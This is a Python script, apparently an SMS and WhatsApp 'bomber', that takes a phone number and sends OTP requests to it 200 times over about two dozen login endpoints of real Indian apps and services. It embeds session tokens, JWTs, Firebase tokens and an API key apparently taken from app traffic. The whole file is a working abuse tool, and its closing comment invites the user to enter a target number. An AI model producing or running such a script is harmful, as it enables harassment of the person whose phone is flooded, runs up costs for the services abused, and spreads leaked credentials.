import requests
import json
import time

def smsgii(number):
    number = str(number)
    
 # List of APIs with their corresponding URLs, headers, and payloads
    
    apis = [   
        {
            "method": "POST",
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "8",
                "app-version": "10260",
                "client-os": "behrouz_android",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://api.carselonadaily.com/api/customer/v2/login",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": "auth",
                "host": "api.carselonadaily.com"
            },
            "data": {
                "phone": number,
                "otpType": 0
            }
        },
        {
            "method": "POST",
            "url": "https://api.oyela.in/auth/generate_sms_otp",
            "headers": {
                "Host": "api.oyela.in",
                "accept": "application/json, text/plain, */*",
                "authorization": "",
                "clientdata": json.dumps({"platform": "mobile", "device_type": "android", "channel": "oyela-app", "app_version": "1.5.1"}),
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "phone": "+91"+number,
                "provider": "provider_3"
            }
        },
        {
            "method": "POST",
            "url": "https://mybillbook.in/api/request_otp",
            "headers": {
                "Host": "mybillbook.in",
                "authorization": "Bearer",
                "device-id": "c7abc1fd7459e84c",
                "client": "android",
                "accept": "application/json",
                "company-id": "",
                "language": "english",
                "client-version": "299",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "mobile_number": number,
                "otp_channel": "whatsapp"
            }
        },
        {
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "method": "POST",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "phone": number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone": "+91"+number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge?resend=true",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone":"+91"+ number
            }
        },
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Host": "api-gateway.juno.lenskart.com",
                "x-country-code-override": "IN",
                "accept-language": "en",
                "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
                "appversion": "4.2.6 (240405001)",
                "accept-encoding": "gzip",
                "x-build-version": "240405001",
                "api_key": "valyoo123",
                "x-accept-language": "en",
                "x-api-client": "android",
                "model": "SM-F7110",
                "x-b3-traceid": "1714497016147",
                "udid": "c7abc1fd7459e84c",
                "x-country-code": "IN",
                "brand": "samsung",
                "uniqueid": "18f2ffc5153c7abc",
                "content-type": "application/json",
                "x-app-version": "4.2.6 (240405001)",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneCode": "+91",
                "telephone": number
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "initiatePhoneOTP",
                    "phoneNumber": f"91{number}"
                }
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "resendOTP",
                    "phoneNumber": f"91{number}",
                    "userID": "",
                    "resendOTPCommunicationType": "whatsapp"
                }
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "guest_token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "user": {
                    "phone_number": f"+91{number}"
                },
                "invite_code": ""
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "user": {
                    "phone_number": f"+91{number}"
                },
                "via": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://tradws.stocknote.com/samco-webservice/AOF/LoginMobileOtp/1.0.0",
            "headers": {
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "tradws.stocknote.com",
                "Connection": "Keep-Alive",
                "Content-Length": "258"
            },
            "data": {
                "request": {
                    "appID": "9218fd7787cf85cc9f58a7c3482a93bc",
                    "formFactor": "M",
                    "requestType": "U",
                    "response_format": "json",
                    "data": {
                        "mobile": number,
                        "remote_add": "0.0.0.0",
                        "user_agent": "StockNote -42041,Android,Google,Android 14,CFNetwork 808.3,Darwin 16.3.0"
                    }
                }
            }
        },
        {
            "method": "POST",
            "url": "https://jarvis.divinetalk.live/api/v7/sendOtp",
            "headers": {
                "User-Agent": "Dart/3.4 (dart:io)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            },
            "data": {
                "mobile_no": number
            }
        },
        {
            "method": "POST",
            "url": "https://web-backend.biryanibykilo.com/backend-app/authentication/api/v2/send_otp",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJpc19ndWVzdCI6dHJ1ZSwidHMiOiIyMDI0LTA1LTAzIDA0OjM0OjU4Iiwic291cmNlIjoiYXBwIiwicmVmcmVzaF90cyI6IjIwMjQtMDUtMTMgMDQ6MzQ6NTgifQ.WCluN6-GDSQbK4C7cifxTALUf2gEqe03AuJMld4lDuE",
                "platform": "android",
                "appversion": "19.0.0",
                "x-access-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "client-id": "bbk",
                "Content-Type": "application/json",
                "Content-Length": "329",
                "Host": "web-backend.biryanibykilo.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            },
            "data": {
                "mobile": number,
                "device_type": "app",
                "is_signup": False,
                "login_id": "",
                "firebase_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "retry": False
            }
        },
        {
            "method": "POST",
            "url": "https://customerapp-gateway.porter.in/onboarding/customer/resend_otp/whatsapp",
            "headers": {
                "Host": "customerapp-gateway.porter.in",
                "country": "in",
                "preferred-languages": "{\"app_language\":\"en\"}",
                "brand": "porter",
                "source": "android",
                "version-name": "5.69.2",
                "custom-app-version-code": "242",
                "client-request-uuid": "14ded413-164b-411e-99eb-7ff33ae4ad49",
                "installation-id": "0fe7940e-b9df-46d0-83bf-a59b7645b79b",
                "app-session-id": "3b06ceaf-726c-4bd9-97de-01d5e45c74ab",
                "accept-charset": "UTF-8",
                "accept": "*/*",
                "user-agent": "Ktor client",
                "content-type": "application/json",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number,
                "organizationId": "64254d66be2a390018e6d348"
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "firstName": "shiva",
                "lastName": "",
                "mobile": number,
                "countryCode": "+91"
            }
        },
        {
            "method": "POST",
            "url": "https://api.hogr.app/api/apigateway?api=generateotp",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "host": "api.hogr.app",
                "Content-Length": "225"
            },
            "data": {
                "phone": f"+91{number}",
                "can_whatsapp_messages": True,
                "pk": "f6mx-A0_SGK_UxnbwVi2kN:APA91bEgFLmpvykAXsU0owL35Uzjogpl6WLxU53GY2X0VLxuA-FQ5W5lO7dmRUaX2tnwTRFELrGPuDfMGsqFLoqUNeyzaQKi7ka2GiXxQ-yytVRe6vEq0yyQdb-3uPBRF_0NjzGfl0B6"
            }
        },
        {
            "url": "https://api.toolsvilla.com/web/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": {"firstname": "", "mobileno": number, "email": "", "wtpSubs": True}
        },
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "SMS"}
        },
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "WHATSAPP"}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&isResend=true",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        }
        
        
    ]
    
    # Run the requests for 20 times
    for _ in range(200):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
        # time.sleep(1)

# Example usage:
#smsgii("93")  # Replace "942" with the phone number you want to use
